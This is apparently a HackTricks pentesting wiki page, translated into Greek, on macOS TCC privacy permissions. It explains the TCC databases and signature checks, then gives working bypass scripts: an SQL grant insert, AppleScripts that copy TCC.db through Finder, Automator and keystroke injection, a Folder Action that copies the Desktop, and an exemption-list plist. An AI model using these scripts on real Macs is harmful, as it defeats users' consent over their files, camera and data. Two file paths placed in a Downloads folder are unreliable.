# macOS TCC

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

**TCC (Διαφάνεια, Συναίνεση και Έλεγχος)** είναι ένα πρωτόκολλο ασφαλείας που επικεντρώνεται στη ρύθμιση των αδειών εφαρμογών. Ο κύριος ρόλος του είναι να προστατεύει ευαίσθητες δυνατότητες όπως **υπηρεσίες τοποθεσίας, επαφές, φωτογραφίες, μικρόφωνο, κάμερα, προσβασιμότητα και πλήρης πρόσβαση στο δίσκο**. Απαιτώντας ρητή συναίνεση του χρήστη πριν από την παροχή πρόσβασης στην εφαρμογή σε αυτά τα στοιχεία, το TCC ενισχύει την ιδιωτικότητα και τον έλεγχο του χρήστη πάνω στα δεδομένα του.

Οι χρήστες συναντούν το TCC όταν οι εφαρμογές ζητούν πρόσβαση σε προστατευμένες δυνατότητες. Αυτό είναι ορατό μέσω μιας προτροπής που επιτρέπει στους χρήστες να **εγκρίνουν ή να απορρίψουν την πρόσβαση**. Επιπλέον, το TCC διευκολύνει άμεσες ενέργειες του χρήστη, όπως **σύρσιμο και απόθεση αρχείων σε μια εφαρμογή**, για να παραχωρήσει πρόσβαση σε συγκεκριμένα αρχεία, διασφαλίζοντας ότι οι εφαρμογές έχουν πρόσβαση μόνο σε ό,τι έχει ρητά επιτραπεί.

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** διαχειρίζεται από το **daemon** που βρίσκεται στο `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` και ρυθμίζεται στο `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (καταχωρώντας την υπηρεσία mach `com.apple.tccd.system`).

Υπάρχει ένα **tccd σε λειτουργία χρήστη** που εκτελείται ανά χρήστη που έχει συνδεθεί, καθορισμένο στο `/System/Library/LaunchAgents/com.apple.tccd.plist`, καταχωρώντας τις υπηρεσίες mach `com.apple.tccd` και `com.apple.usernotifications.delegate.com.apple.tccd`.

Εδώ μπορείτε να δείτε το tccd να εκτελείται ως σύστημα και ως χρήστης:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions are **κληρονομούμενες από την γονική** εφαρμογή και οι **άδειες** **παρακολουθούνται** με βάση το **Bundle ID** και το **Developer ID**.

### TCC Βάσεις Δεδομένων

Οι επιτρεπόμενες/απαγορευμένες ενέργειες αποθηκεύονται σε κάποιες βάσεις δεδομένων TCC:

* Η βάση δεδομένων σε **`/Library/Application Support/com.apple.TCC/TCC.db`** .
* Αυτή η βάση δεδομένων είναι **προστατευμένη από SIP**, οπότε μόνο μια παράκαμψη SIP μπορεί να γράψει σε αυτήν.
* Η βάση δεδομένων TCC του χρήστη **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** για προτιμήσεις ανά χρήστη.
* Αυτή η βάση δεδομένων είναι προστατευμένη, οπότε μόνο διαδικασίες με υψηλά δικαιώματα TCC όπως η Πρόσβαση σε Όλο τον Δίσκο μπορούν να γράψουν σε αυτήν (αλλά δεν προστατεύεται από SIP).

{% hint style="warning" %}
Οι προηγούμενες βάσεις δεδομένων είναι επίσης **προστατευμένες TCC για πρόσβαση ανάγνωσης**. Έτσι, **δεν θα μπορείτε να διαβάσετε** τη βάση δεδομένων TCC του κανονικού σας χρήστη εκτός αν είναι από μια διαδικασία με δικαιώματα TCC.

Ωστόσο, θυμηθείτε ότι μια διαδικασία με αυτά τα υψηλά δικαιώματα (όπως **FDA** ή **`kTCCServiceEndpointSecurityClient`**) θα μπορεί να γράψει στη βάση δεδομένων TCC των χρηστών.
{% endhint %}

* Υπάρχει μια **τρίτη** βάση δεδομένων TCC σε **`/var/db/locationd/clients.plist`** για να υποδείξει τους πελάτες που επιτρέπεται να **πρόσβαση στις υπηρεσίες τοποθεσίας**.
* Το αρχείο που προστατεύεται από SIP **`/Users/carlospolop/Downloads/REG.db`** (επίσης προστατευμένο από πρόσβαση ανάγνωσης με TCC), περιέχει την **τοποθεσία** όλων των **έγκυρων βάσεων δεδομένων TCC**.
* Το αρχείο που προστατεύεται από SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (επίσης προστατευμένο από πρόσβαση ανάγνωσης με TCC), περιέχει περισσότερες άδειες που έχουν παραχωρηθεί από TCC.
* Το αρχείο που προστατεύεται από SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (αλλά αναγνώσιμο από οποιονδήποτε) είναι μια λίστα επιτρεπόμενων εφαρμογών που απαιτούν εξαίρεση TCC.

{% hint style="success" %}
Η βάση δεδομένων TCC σε **iOS** είναι σε **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
Η **διεπαφή του κέντρου ειδοποιήσεων** μπορεί να κάνει **αλλαγές στη βάση δεδομένων TCC του συστήματος**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Ωστόσο, οι χρήστες μπορούν να **διαγράψουν ή να ερωτήσουν κανόνες** με το **`tccutil`** εργαλείο γραμμής εντολών.
{% endhint %}

#### Ερώτηση στις βάσεις δεδομένων

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="βάση δεδομένων συστήματος" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Ελέγχοντας και τις δύο βάσεις δεδομένων μπορείτε να ελέγξετε τις άδειες που έχει επιτρέψει μια εφαρμογή, έχει απαγορεύσει ή δεν έχει (θα ζητήσει).
{% endhint %}

* Η **`service`** είναι η συμβολοσειρά αναπαράστασης της **άδειας** TCC
* Η **`client`** είναι το **bundle ID** ή η **διαδρομή προς το δυαδικό** με τις άδειες
* Η **`client_type`** υποδεικνύει αν είναι ένα Bundle Identifier(0) ή μια απόλυτη διαδρομή(1)

<details>

<summary>Πώς να εκτελέσετε αν είναι απόλυτη διαδρομή</summary>

Απλά κάντε **`launctl load you_bin.plist`**, με ένα plist όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* Η **`auth_value`** μπορεί να έχει διαφορετικές τιμές: denied(0), unknown(1), allowed(2) ή limited(3).
* Η **`auth_reason`** μπορεί να πάρει τις εξής τιμές: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Το πεδίο **csreq** είναι εκεί για να υποδείξει πώς να επαληθεύσετε το δυαδικό αρχείο προς εκτέλεση και να παραχωρήσετε τα δικαιώματα TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Για περισσότερες πληροφορίες σχετικά με τα **άλλα πεδία** του πίνακα [**ελέγξτε αυτήν την ανάρτηση στο blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Μπορείτε επίσης να ελέγξετε **τις ήδη παραχωρηθείσες άδειες** σε εφαρμογές στο `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

{% hint style="success" %}
Οι χρήστες _μπορούν_ να **διαγράψουν ή να ερωτήσουν κανόνες** χρησιμοποιώντας **`tccutil`**.
{% endhint %}

#### Επαναφορά αδειών TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Έλεγχοι Υπογραφής

Η βάση δεδομένων TCC **αποθηκεύει** το **Bundle ID** της εφαρμογής, αλλά επίσης **αποθηκεύει** **πληροφορίες** σχετικά με την **υπογραφή** για να **διασφαλίσει** ότι η εφαρμογή που ζητά να χρησιμοποιήσει μια άδεια είναι η σωστή. 

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Ως εκ τούτου, άλλες εφαρμογές που χρησιμοποιούν το ίδιο όνομα και ID πακέτου δεν θα μπορούν να έχουν πρόσβαση στις παραχωρηθείσες άδειες που έχουν δοθεί σε άλλες εφαρμογές.
{% endhint %}

### Δικαιώματα & Άδειες TCC

Οι εφαρμογές **δεν χρειάζεται μόνο** να **ζητούν** και να έχουν **παραχωρηθεί πρόσβαση** σε ορισμένους πόρους, αλλά πρέπει επίσης να **έχουν τα σχετικά δικαιώματα.**\
Για παράδειγμα, το **Telegram** έχει το δικαίωμα `com.apple.security.device.camera` για να ζητήσει **πρόσβαση στην κάμερα**. Μια **εφαρμογή** που **δεν έχει** αυτό το **δικαίωμα δεν θα μπορεί** να έχει πρόσβαση στην κάμερα (και ο χρήστης δεν θα ρωτηθεί καν για τις άδειες).

Ωστόσο, για να **έχουν πρόσβαση** οι εφαρμογές σε **ορισμένους φακέλους χρηστών**, όπως `~/Desktop`, `~/Downloads` και `~/Documents`, **δεν χρειάζεται** να έχουν κανένα συγκεκριμένο **δικαίωμα.** Το σύστημα θα διαχειριστεί διαφανώς την πρόσβαση και θα **ζητήσει από τον χρήστη** όπως απαιτείται.

Οι εφαρμογές της Apple **δεν θα δημιουργήσουν προτροπές.** Περιέχουν **προπαραχωρημένα δικαιώματα** στη λίστα **δικαιωμάτων** τους, που σημαίνει ότι **δεν θα δημιουργήσουν ποτέ αναδυόμενο παράθυρο**, **ούτε** θα εμφανιστούν σε καμία από τις **βάσεις δεδομένων TCC.** Για παράδειγμα:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Αυτό θα αποτρέψει το Calendar να ζητήσει από τον χρήστη να έχει πρόσβαση σε υπενθυμίσεις, ημερολόγιο και το βιβλίο διευθύνσεων.

{% hint style="success" %}
Εκτός από κάποια επίσημη τεκμηρίωση σχετικά με τα δικαιώματα, είναι επίσης δυνατό να βρείτε ανεπίσημες **ενδιαφέρουσες πληροφορίες σχετικά με τα δικαιώματα στο** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Ορισμένες άδειες TCC είναι: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Δεν υπάρχει δημόσια λίστα που να ορίζει όλες αυτές, αλλά μπορείτε να ελέγξετε αυτή τη [**λίστα με τις γνωστές**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Ευαίσθητα μη προστατευμένα μέρη

* $HOME (αυτό)
* $HOME/.ssh, $HOME/.aws, κ.λπ.
* /tmp

### Πρόθεση Χρήστη / com.apple.macl

Όπως αναφέρθηκε προηγουμένως, είναι δυνατό να **παραχωρήσετε πρόσβαση σε μια εφαρμογή σε ένα αρχείο με τη μέθοδο drag\&drop**. Αυτή η πρόσβαση δεν θα καθορίζεται σε καμία βάση δεδομένων TCC αλλά ως **εκτεταμένο** **χαρακτηριστικό του αρχείου**. Αυτό το χαρακτηριστικό θα **αποθηκεύει το UUID** της επιτρεπόμενης εφαρμογής:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Είναι περίεργο ότι το **`com.apple.macl`** χαρακτηριστικό διαχειρίζεται από το **Sandbox**, όχι το tccd.

Επίσης σημειώστε ότι αν μετακινήσετε ένα αρχείο που επιτρέπει το UUID μιας εφαρμογής στον υπολογιστή σας σε διαφορετικό υπολογιστή, επειδή η ίδια εφαρμογή θα έχει διαφορετικά UIDs, δεν θα παραχωρήσει πρόσβαση σε αυτή την εφαρμογή.
{% endhint %}

Το εκτεταμένο χαρακτηριστικό `com.apple.macl` **δεν μπορεί να διαγραφεί** όπως άλλα εκτεταμένα χαρακτηριστικά επειδή είναι **προστατευμένο από το SIP**. Ωστόσο, όπως [**εξηγείται σε αυτή την ανάρτηση**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), είναι δυνατόν να το απενεργοποιήσετε **συμπιέζοντας** το αρχείο, **διαγράφοντας** το και **αποσυμπιέζοντας** το.

## TCC Privesc & Bypasses

### Εισαγωγή στο TCC

Αν σε κάποιο σημείο καταφέρετε να αποκτήσετε δικαιώματα εγγραφής σε μια βάση δεδομένων TCC, μπορείτε να χρησιμοποιήσετε κάτι σαν το παρακάτω για να προσθέσετε μια καταχώρηση (αφαιρέστε τα σχόλια):

<details>

<summary>Παράδειγμα εισαγωγής στο TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Αν καταφέρατε να μπείτε σε μια εφαρμογή με κάποιες άδειες TCC, ελέγξτε την παρακάτω σελίδα με τα payloads TCC για να τις εκμεταλλευτείτε:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple Events

Μάθετε για τα Apple Events στο:

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### Automation (Finder) to FDA\*

Το όνομα TCC της άδειας Automation είναι: **`kTCCServiceAppleEvents`**\
Αυτή η συγκεκριμένη άδεια TCC υποδεικνύει επίσης την **εφαρμογή που μπορεί να διαχειριστεί** μέσα στη βάση δεδομένων TCC (έτσι οι άδειες δεν επιτρέπουν απλώς τη διαχείριση όλων).

**Finder** είναι μια εφαρμογή που **έχει πάντα FDA** (ακόμα και αν δεν εμφανίζεται στο UI), οπότε αν έχετε **άδειες Automation** πάνω της, μπορείτε να εκμεταλλευτείτε τις άδειές της για να **την κάνετε να εκτελέσει κάποιες ενέργειες**.\
Σε αυτή την περίπτωση, η εφαρμογή σας θα χρειαστεί την άδεια **`kTCCServiceAppleEvents`** πάνω σε **`com.apple.Finder`**.

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Κλοπή συστημάτων TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Μπορείτε να το εκμεταλλευτείτε αυτό για να **γράψετε τη δική σας βάση δεδομένων TCC χρήστη**.

{% hint style="warning" %}
Με αυτή την άδεια θα μπορείτε να **ζητήσετε από τον Finder να αποκτήσει πρόσβαση σε περιορισμένους φακέλους TCC** και να σας δώσει τα αρχεία, αλλά όσο γνωρίζω δεν θα μπορείτε να κάνετε τον Finder να εκτελεί αυθαίρετο κώδικα για να εκμεταλλευτείτε πλήρως την πρόσβαση FDA του.

Επομένως, δεν θα μπορείτε να εκμεταλλευτείτε πλήρως τις δυνατότητες της FDA.
{% endhint %}

Αυτή είναι η προτροπή TCC για να αποκτήσετε δικαιώματα Αυτοματοποίησης πάνω στον Finder:

<figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Σημειώστε ότι επειδή η εφαρμογή **Automator** έχει την άδεια TCC **`kTCCServiceAppleEvents`**, μπορεί να **ελέγξει οποιαδήποτε εφαρμογή**, όπως τον Finder. Έτσι, έχοντας την άδεια να ελέγξετε τον Automator, θα μπορούσατε επίσης να ελέγξετε τον **Finder** με έναν κώδικα όπως ο παρακάτω:
{% endhint %}

<details>

<summary>Αποκτήστε ένα shell μέσα στον Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Το ίδιο συμβαίνει με την **εφαρμογή Script Editor,** μπορεί να ελέγξει τον Finder, αλλά χρησιμοποιώντας ένα AppleScript δεν μπορείτε να το αναγκάσετε να εκτελέσει ένα σενάριο.

### Αυτοματοποίηση (SE) σε κάποιο TCC

**Τα System Events μπορούν να δημιουργήσουν Folder Actions, και οι Folder actions μπορούν να έχουν πρόσβαση σε ορισμένους φακέλους TCC** (Επιφάνεια Εργασίας, Έγγραφα & Λήψεις), οπότε ένα σενάριο όπως το παρακάτω μπορεί να χρησιμοποιηθεί για να εκμεταλλευτεί αυτή τη συμπεριφορά:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Αυτοματοποίηση (SE) + Προσβασιμότητα (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** για FDA\*

Η αυτοματοποίηση στο **`System Events`** + Προσβασιμότητα (**`kTCCServicePostEvent`**) επιτρέπει την αποστολή **πιέσεων πλήκτρων σε διεργασίες**. Με αυτόν τον τρόπο θα μπορούσατε να εκμεταλλευτείτε το Finder για να αλλάξετε το TCC.db των χρηστών ή να δώσετε FDA σε μια αυθαίρετη εφαρμογή (αν και μπορεί να ζητηθεί κωδικός πρόσβασης γι' αυτό).

Παράδειγμα αντικατάστασης του TCC.db των χρηστών από το Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` για FDA\*

Δείτε αυτή τη σελίδα για μερικά [**payloads για κατάχρηση των δικαιωμάτων Accessibility**](macos-tcc-payloads.md#accessibility) για privesc σε FDA\* ή για να τρέξετε ένα keylogger για παράδειγμα.

### **Endpoint Security Client για FDA**

Αν έχετε **`kTCCServiceEndpointSecurityClient`**, έχετε FDA. Τέλος.

### Αρχείο Πολιτικής Συστήματος SysAdmin για FDA

**`kTCCServiceSystemPolicySysAdminFiles`** επιτρέπει να **αλλάξετε** την **`NFSHomeDirectory`** ιδιότητα ενός χρήστη που αλλάζει τον φάκελο του και επομένως επιτρέπει να **παρακάμψετε το TCC**.

### Βάση Δεδομένων TCC Χρήστη για FDA

Αποκτώντας **δικαιώματα εγγραφής** πάνω στη **βάση δεδομένων TCC** του χρήστη δεν μπορείτε να παραχωρήσετε στον εαυτό σας **`FDA`** δικαιώματα, μόνο αυτός που βρίσκεται στη βάση δεδομένων του συστήματος μπορεί να το παραχωρήσει.

Αλλά μπορείτε να **δώσετε** στον εαυτό σας **`Automation rights to Finder`**, και να καταχραστείτε την προηγούμενη τεχνική για να κλιμακωθείτε σε FDA\*.

### **FDA σε δικαιώματα TCC**

**Full Disk Access** είναι το όνομα TCC **`kTCCServiceSystemPolicyAllFiles`**

Δεν νομίζω ότι αυτό είναι πραγματική privesc, αλλά για κάθε περίπτωση που μπορεί να το βρείτε χρήσιμο: Αν ελέγχετε ένα πρόγραμμα με FDA μπορείτε να **τροποποιήσετε τη βάση δεδομένων TCC των χρηστών και να δώσετε στον εαυτό σας οποιαδήποτε πρόσβαση**. Αυτό μπορεί να είναι χρήσιμο ως τεχνική επιμονής σε περίπτωση που μπορεί να χάσετε τα δικαιώματα FDA.

### **SIP Bypass για TCC Bypass**

Η βάση δεδομένων **TCC** του συστήματος προστατεύεται από **SIP**, γι' αυτό μόνο οι διαδικασίες με τις **καθορισμένες εξουσιοδοτήσεις θα μπορούν να την τροποποιήσουν**. Επομένως, αν ένας επιτιθέμενος βρει ένα **SIP bypass** πάνω σε ένα **αρχείο** (να μπορεί να τροποποιήσει ένα αρχείο που περιορίζεται από SIP), θα μπορεί να:

* **Αφαιρέσει την προστασία** μιας βάσης δεδομένων TCC και να δώσει στον εαυτό του όλα τα δικαιώματα TCC. Θα μπορούσε να καταχραστεί οποιοδήποτε από αυτά τα αρχεία για παράδειγμα:
* Η βάση δεδομένων TCC συστημάτων
* REG.db
* MDMOverrides.plist

Ωστόσο, υπάρχει μια άλλη επιλογή για να καταχραστεί αυτό το **SIP bypass για να παρακάμψει το TCC**, το αρχείο `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` είναι μια λίστα επιτρεπόμενων εφαρμογών που απαιτούν μια εξαίρεση TCC. Επομένως, αν ένας επιτιθέμενος μπορεί να **αφαιρέσει την προστασία SIP** από αυτό το αρχείο και να προσθέσει την **δική του εφαρμογή**, η εφαρμογή θα μπορεί να παρακάμψει το TCC.\
Για παράδειγμα για να προσθέσετε το terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Αναφορές

